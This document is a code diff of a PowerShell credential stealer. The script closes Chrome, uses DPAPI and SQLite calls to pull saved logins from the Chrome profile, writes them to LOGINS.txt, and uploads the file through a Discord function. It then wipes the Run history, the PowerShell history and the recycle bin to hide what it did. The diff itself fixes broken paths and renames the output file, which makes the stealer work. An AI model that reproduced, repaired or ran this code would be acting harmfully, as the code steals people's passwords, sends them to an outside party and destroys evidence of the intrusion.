@@ -1,7 +1,8 @@
-$FileName = "$env:USERNAME$_User-VJMI.txt"
+$FileName = "LOGINS.txt"
 
 Stop-Process -Name Chrome -ErrorAction SilentlyContinue
 
+# Add error handling
 $d = Add-Type -ErrorAction Stop -PassThru -AssemblyName System.Security
 $p = 'public static'
 $g = """)]$p extern"
@@ -9,12 +10,14 @@ $i = '[DllImport("winsqlite3",EntryPoint="sqlite3_'
 $m = "[MarshalAs(UnmanagedType.LP"
 $q = '(s,i)'
 $f = '(p s,int i)'
-$z = "$env:LOCALAPPDATAGoogleChromeUser Data"
+$z = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 $u = [Security.Cryptography.ProtectedData]
 
-$l | Out-File -FilePath "$env:TEMP$FileName" -Encoding UTF8
 
-$pathToChrome = 'C:Program Files (x86)GoogleChromeApplicationchrome.exe'
+$l | Out-File -FilePath "$env:TEMP\$FileName" -Encoding UTF8
+
+
+$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
 Start-Process -FilePath $pathToChrome
 
 function Upload-Discord {
@@ -41,11 +44,13 @@ function Upload-Discord {
     }
 }
 
+
 if (-not [string]::IsNullOrEmpty($FileName)){
-    Upload-Discord -file "$env:TEMP$FileName"
+    Upload-Discord -file "$env:TEMP\$FileName"
 }
 
-Remove-Item -Path "HKCU:SoftwareMicrosoftWindowsCurrentVersionExplorerRunMRU" -Force -ErrorAction SilentlyContinue
+
+Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
